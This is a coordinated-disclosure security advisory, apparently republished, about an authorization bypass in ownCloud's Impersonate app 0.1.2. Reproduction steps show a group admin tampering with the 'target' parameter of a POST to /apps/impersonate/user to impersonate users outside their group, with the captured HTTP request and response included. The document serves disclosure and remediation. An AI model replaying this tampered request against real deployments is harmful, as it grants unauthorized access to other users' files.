@@ -1,0 +1,129 @@
+id: 31010
+date: 08/31/2018
+title: ownCloud 0.1.2 User Impersonation Authorization Bypass Vulnerability
+author: Thierry Viaccoz
+cves: 
+
+#############################################################
+#
+# Product:  ownCloud Impersonate
+# Vendor:   ownCloud
+# CSNC ID:  CSNC-2018-015
+# CVE ID:   N/A
+# Subject:  Authorization bypass
+# Risk:     High
+# Effect:   Remotely exploitable
+# Author:   Thierry Viaccoz <thierry.viaccoz@compass-security.com>
+# Date:     29.08.2018
+#
+#############################################################
+
+
+Introduction:
+-------------
+ownCloud [1] is a suite of client-server software for creating file hosting services and using them. An app called Impersonate [2] was created to allow administrators to impersonate other users.
+
+According to the documentation [3], group admins should only be able to access users of the groups they are administrator of.
+
+Compass Security discovered that it was possible for a group admin to impersonate any user, except global administrators.
+
+This way, group admins have access to data of users of other groups, even though they shouldn't.
+
+
+Affected:
+---------
+Vulnerable:
+ * Version 0.1.2
+
+Not vulnerable:
+ * Version 0.2.0
+
+No other version was tested, but it is believed for the older versions to be vulnerable too.
+
+
+Technical Description
+---------------------
+In order to reproduce the vulnerability, follow the steps below.
+
+Create two groups:
+ * group1
+ * group2
+
+Create four users as follows:
+ * test1; group = group1; group admin = group1
+ * test2; group = group1; group admin = no group
+ * test3; group = group2; group admin = group2
+ * test4; group = group2; group admin = no group
+
+Activate the Impersonate app in Settings > Admin > Apps.
+
+Go to Settings > Admin > Apps > User Authentication, check "Allow group admins to impersonate users from these groups" and add the two groups "group1" and "group2".
+
+Log in with "test1", open the user page and impersonate the user "test2". There, intercept the POST request to /apps/impersonate/user and replace "target=test2" by "target=test3" in the body as shown below.
+
+As a result, the user "test1" will impersonate the user "test3", even though "test1" is only group admin of "group1" and "test3" is not in this group.
+
+Request:
+=========
+POST /apps/impersonate/user HTTP/1.1
+Host: demo.owncloud.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+requesttoken: [CUT]
+OCS-APIREQUEST: true
+X-Requested-With: XMLHttpRequest
+Content-Length: 12
+Cookie: [CUT]
+Connection: close
+
+target=test3
+=========
+
+Response:
+=========
+HTTP/1.1 200 OK
+Cache-Control: no-cache, must-revalidate
+Content-Length: 2
+Content-Security-Policy: default-src 'none';manifest-src 'self';script-src 'self' 'unsafe-eval';style-src 'self' 'unsafe-inline';img-src 'self' data: blob:;font-src 'self';connect-src 'self';media-src 'self'
+Content-Type: application/json; charset=utf-8
+Date: Thu, 15 Mar 2018 15:21:14 GMT
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Pragma: no-cache
+Server: Apache
+Strict-Transport-Security: max-age=15768000; preload
+X-Content-Type-Options: nosniff
+X-Download-Options: noopen
+X-Frame-Options: SAMEORIGIN
+X-Permitted-Cross-Domain-Policies: none
+X-Robots-Tag: none
+X-Xss-Protection: 1; mode=block
+Connection: close
+
+[]
+=========
+
+
+Workaround / Fix:
+-----------------
+Check the authorization consistently to prevent group admins to be able to impersonate users from other groups.
+
+
+Timeline:
+---------
+2018-08-29:     Coordinated public disclosure date
+2018-04-17:     Release of fixed version 0.2.0
+2018-03-16:     Initial vendor response
+2018-03-16:     Initial vendor notification
+2018-03-15:     Discovery by Thierry Viaccoz
+
+
+References:
+-----------
+[1] https://owncloud.org/
+[2] https://marketplace.owncloud.com/apps/impersonate
+[3] https://doc.owncloud.org/server/10.0/admin_manual/issues/impersonate_users.html
+
+#  0day.today [2023-03-24]  #
